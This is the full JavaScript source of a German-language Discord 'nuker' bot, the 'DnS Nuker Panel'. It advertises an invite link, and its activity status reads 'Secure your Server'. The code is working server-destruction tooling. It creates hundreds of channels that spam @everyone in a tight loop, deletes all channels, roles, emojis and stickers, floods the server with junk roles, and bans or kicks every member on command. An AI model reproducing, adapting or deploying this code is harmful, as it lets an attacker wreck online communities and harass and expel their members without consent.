/**
 * DnS Nuker Panel
 * @Prebuild ExothDE & Na0
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(green(`



                              ▒█▄░▒█ ▒█▀▀▀█ ▒█▀▀█ ▒█▀▀▄ ▒█▀▀▀█ ▒█▀▀▀ ▀█▀ ▀▀█▀▀ ▒█▀▀▀ 
                              ▒█▒█▒█ ▒█░░▒█ ▒█▄▄▀ ▒█░▒█ ░▀▀▀▄▄ ▒█▀▀▀ ▒█░ ░▒█░░ ▒█▀▀▀ 
                              ▒█░░▀█ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▀ ▒█▄▄▄█ ▒█▄▄▄ ▄█▄ ░▒█░░ ▒█▄▄▄



                                   DnS Panel Server Invite: https://discord.gg/NxXCZPMFkP
                                                Prebuild by na0 & ExothDE 
                                             Nuker: ${nuker.user.tag}
                                                      Prefix: ${prefix}
                                                   DnS Panel Nuker


    commands:
   ------------------------------------------

    Mass Channels: = !mc 100 Nuked by ExothDE
    Mass Ping Spammen: = !mp 100 Nuked by ExothDE
    Mass Rollen erstellen: = !mr ExothDE 10
    Mass Löschen alle Channels: = !dc
    Mass Rollen Löschen: = !dr
    Mass Löscheb Emojis: = !de
    Mass Löschen Stickers: = !ds
    Mass kick Mitglieder: = !mk
    Mass Ban Mitglieder: = !mb

   ------------------------------------------

    `))
    nuker.user.setActivity({ name: "Secure your Server", type: "IDLE" });
});

nuker.on("messageCreate", (message) => {

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`**DnS Panel Server Invite: https://discord.gg/NxXCZPMFkP**
    \n__Massen Ping: !mp 100 Nuked by ExothDE__\n__Massen Ban: !mb Ban Alle Mitglieder__\n__Rollen Löschen: !dr Lösch alle Rollen__\n__Rollen erstellen: !mr ExothDE 10__\n__Mass Channels: !mc 100 Nuked by ExothDE__\n__Lösch Channels: !dc Lösch alle Channel__\n__Lösch Emojis: !de Löscht alle Emojis __\n__Lösch Stickers: !ds Lösch alle Sticker __\n__Kick alle : !mk kick alle Member__\n\n**Credits: Prebuild von DnS ExothDE#0888**\n__Webseite: https://Exoth.de__`)
        .setFooter(`DnS Nuker Panel`)
        .setColor(0)
        .setThumbnail(`https://media.discordapp.net/attachments/825013748875132989/942912894939582504/de6fb30aa04f8293a0e30aa91aeb1f44.png`)
        .setImage(`https://media.discordapp.net/attachments/825013748875132989/942912393862873169/unknown.png`)
        .setTimestamp(Date.now());

    // Perms
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // Possible Args
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; // Used for amount
    var args2 = args.slice(1).join(' ') // Naming things
    var args3 = args.slice(2).join(', '); // Other

    if (!disableEveryone) {
        // Commands

        // Panel
        if (message.content.startsWith(prefix + "panel")) {
            message.channel.send({embeds: [help]})
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "mc")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "mp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "mr")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "dr")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ds")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "de")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "mb")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "mk")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "panel")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            message.channel.send({embeds: [help]})
        }

// nuke
        if (message.content.startsWith(prefix + "nuke")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            message.channel.send({embeds: [help]})
        }


        // Mass Channels
        if (message.content.startsWith(prefix + "mc")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "mp")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "mr")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "dr")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ds")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "de")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "mb")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "mk")) {
            if (message.author.id != userID) return message.reply("Nur mein Schöpfer darf das ausführen <@825013296239345664>");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }

    // Nuking Functions

    /**
     * Excessive amount of channels
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Ungütliger Args: Gebe  den Betrag an, den du für Massenkanäle verwenden möchtest.");
            if (isNaN(amount)) return reject("Typfehler: Verwende eine Zahl für die Menge");
            if (amount > 500) return reject("Menge Fehler: Maximale Gildenkanalgröße ist 500 | Tipp: Verwende eine Zahl kleiner als 500");
            if (!channelPerms) return reject("Achte darauf das ich die Rechte besitze: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} War hier!`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Fehler Gefunden!: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Fehler Gefunden!: " + err)) })
                }
            }
            resolve();
        });
    }

    /**
     * Excessive amount of channels and mentions
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     * @param {string} pingMessage Message to be sent when everyone is mentioned
     */
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Ungütliger Args: Gebe  den Betrag an, den du für MassenPings verwenden möchtest.");
            if (isNaN(amount)) return reject("Typfehler: Verwende eine Zahl für die Menge");
            if (amount > 500) return reject("Menge Fehler: Maximale Gildenkanalgröße ist 500 | Tipp: Verwende eine Zahl kleiner als 500");
            if (!channelPerms) return reject("Achte darauf das ich die Rechte besitze: 'MANAGE_CHANNELS'");
            if (!pingMessage) return reject("Unspecified Args: Specify the message you wish to mass mention");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} War hier!`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Fehler Gefunden!: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Fehler Gefunden!: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1); // literally not possible but lol?
                    });
                }
            }
            resolve();
        });
    }

    /**
     * Deletes all channels in a guild
     */
    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Achte darauf das ich die Rechte besitze: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Fehler Gefunden!: " + err)) }))
            resolve();
        });
    }

    /**
     * Excessive amount of roles
     * @param {number} amount Amount of roles
     * @param {string} roleName Role name
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Geb den Betrag an, den du für Massenrollen verwenden möchtest");
            if (isNaN(amount)) return reject("Typfehler: Verwende eine Zahl für die Menge");
            if (!rolePerms) return reject("Achte darauf das ich die Rechte besitze: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Fehler Gefunden!: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Fehler Gefunden!: " + err)) })
                }
            }
        })
    }

    /**
     * Deletes all roles
     */
    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Achte darauf das ich die Rechte besitze: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Fehler Gefunden!: " + err)) }))
        });
    }

    /**
     * Deletes all emotes
     */
    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Achte darauf das ich die Rechte besitze: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Fehler Gefunden!: " + err)) }))
        });
    }

    /**
     * Deletes all stickers
     */
    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Achte darauf das ich die Rechte besitze: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Fehler Gefunden!: " + err)) }))
        });
    }

    /**
     * Ban all guild Members
     */
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Achte darauf das ich die Rechte besitze: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Gefunden: " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Fehler Gefunden!: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was banned.`)) });
                    }
                }, 2000);
            })
        })
    }

    /**
     * Kick all guild Members
     */
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Achte darauf das ich die Rechte besitze: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Gefunden: " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Fehler Gefunden!: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was kicked.`)) });
                    }
                }, 2000);
            })
        })
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
